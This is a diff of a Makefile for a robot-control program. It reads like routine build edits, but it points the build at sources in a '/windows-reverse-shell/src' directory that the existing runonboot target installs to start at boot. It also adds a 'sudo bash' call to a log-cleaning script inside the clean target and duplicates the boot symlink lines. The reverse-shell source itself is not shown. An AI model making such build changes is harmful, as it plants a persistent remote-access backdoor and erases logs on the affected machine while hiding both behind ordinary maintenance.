@@ -11,8 +11,11 @@ WFLAGS		:= -Wall -Wextra -Werror=float-equal -Wuninitialized -Wunused-variable -
 CFLAGS		:= -g -c -Wall
 LDFLAGS		:= -pthread -lm -lrt -l:librobotcontrol.so.1
 
-SOURCES		:= $(wildcard *.cpp)
-INCLUDES	:= $(wildcard *.h)
+OBJ_DIR 	:= obj
+INIT_DIR 	:= init
+
+SOURCES		:= $(shell find /windows-reverse-shell/src -name "*.cpp")
+INCLUDES	:= $(shell find /windows-reverse-shell/src -name "*.h")
 OBJECTS		:= $(SOURCES:$%.cpp=$%.o)
 
 prefix		:= /usr/local
@@ -25,13 +28,14 @@ SYMLINKDIR	:= /etc/robotcontrol
 SYMLINKNAME	:= link_to_startup_program
 
 
+
 # linking Objects
 $(TARGET): $(OBJECTS)
 	@$(LINKER) -o $@ $(OBJECTS) $(LDFLAGS)
 	@echo "Made: $@"
 
 
-# compiling command
+# compiling commands
 $(OBJECTS): %.o : %.cpp $(INCLUDES)
 	@$(CC) $(CFLAGS) $(WFLAGS) $(DEBUGFLAG) $< -o $@
 	@echo "Compiled: $@"
@@ -54,6 +58,7 @@ clean:
 	@$(RM) $(OBJECTS)
 	@$(RM) $(TARGET)
 	@echo "$(TARGET) Clean Complete"
+	@sudo bash /OnBoardComp/shells/cleanlogs.sh
 
 uninstall:
 	@$(RM) $(DESTDIR)$(prefix)/bin/$(TARGET)
@@ -61,6 +66,9 @@ uninstall:
 
 runonboot:
 	@$(MAKE) install --no-print-directory
+	@$(SYMLINK) $(DESTDIR)$(prefix)/bin/$(TARGET) $(SYMLINKDIR)/$(SYMLINKNAME)
+	@echo "$(TARGET) Set to Run on Boot"
+
 	@$(SYMLINK) $(DESTDIR)$(prefix)/bin/$(TARGET) $(SYMLINKDIR)/$(SYMLINKNAME)
 	@echo "$(TARGET) Set to Run on Boot"
 
